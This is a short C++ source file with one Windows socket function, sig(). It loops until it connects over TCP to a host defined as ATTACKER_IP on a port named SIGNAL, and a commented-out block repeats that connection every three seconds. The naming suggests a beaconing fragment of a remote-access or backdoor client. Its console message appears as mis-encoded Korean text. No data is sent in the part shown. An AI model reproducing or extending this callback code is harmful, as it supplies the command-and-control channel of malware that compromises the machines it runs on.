#include"main.h"

void sig() 
{

	SOCKET ssock;
	SOCKADDR_IN saddr = { 0, };
	int flag = 0;
	
	saddr.sin_family = AF_INET;
	saddr.sin_addr.s_addr = inet_addr(ATTACKER_IP);
	saddr.sin_port = htons(SIGNAL);
	ssock = socket(AF_INET, SOCK_STREAM, 0);

	while (connect(ssock, (LPSOCKADDR)&saddr, sizeof(saddr)) == SOCKET_ERROR) {
		cout << "sig ¿¬°áÁß" << endl;
	}
	/*while (1) {
		ssock = socket(AF_INET, SOCK_STREAM, 0);
		connect(ssock, (LPSOCKADDR)&saddr, sizeof(saddr));
		close(ssock);
		Sleep(3000);
	}*/
}